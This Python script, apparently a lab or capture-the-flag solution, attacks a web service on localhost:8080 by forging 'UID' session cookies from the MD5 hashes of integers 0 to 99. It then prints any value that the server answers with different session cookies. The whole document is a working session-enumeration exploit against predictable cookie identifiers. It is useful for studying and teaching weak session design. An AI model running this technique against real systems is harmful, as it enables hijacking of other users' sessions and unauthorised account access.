import hashlib
import codecs
import numpy as np
import requests

#IP
ip = "127.0.0.1"
port= "8080"

#we first check that our MD5 works by comparing Md5(100) with
#the one in the webpage
def md5Enc(string):
	control = "f899139df5e1059396431415e770c6dd"
	tester = string
	tester_b = str.encode(str(tester))
	tester_md5 = hashlib.md5(tester_b).hexdigest()
	return tester_md5

session=requests.Session()
cookies = {'UID': md5Enc(100)}
r = session.post('http://localhost:8080', cookies=cookies)
p=session.cookies.get_dict()

for x in range(0,100):
	session=requests.Session()
	cookies = {'UID': md5Enc(x)}
	r = session.post('http://localhost:8080', cookies=cookies)
	if(p!=session.cookies.get_dict()):
		print(session.cookies.get_dict())
		print(x)
